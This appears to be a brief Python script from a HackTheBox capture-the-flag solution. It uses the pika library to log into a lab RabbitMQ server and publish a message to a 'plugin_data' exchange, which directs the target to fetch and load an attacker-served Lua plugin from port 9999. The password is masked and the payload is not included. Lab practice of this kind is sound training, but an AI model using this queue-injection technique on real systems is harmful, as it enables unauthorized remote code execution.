'''
  | ~~ HackTheBox ~~ |
  script to load lua plugin for queuing
  I'm not giving password find it yourself
  plugin.lua must be on the box and being served via python server on port 9999
  ref: https://pika.readthedocs.io/en/stable/modules/channel.html#id1
'''

import pika


connection = pika.BlockingConnection(
    pika.ConnectionParameters(
        '10.10.10.190',
        5672,
        credentials=pika.PlainCredentials('yuntao', '*********')
    )
)


channel = connection.channel()
channel.basic_publish(
    exchange='plugin_data',
    routing_key='',
    body='http://127.0.0.1:9999/plugin.lua'
)
connection.close()
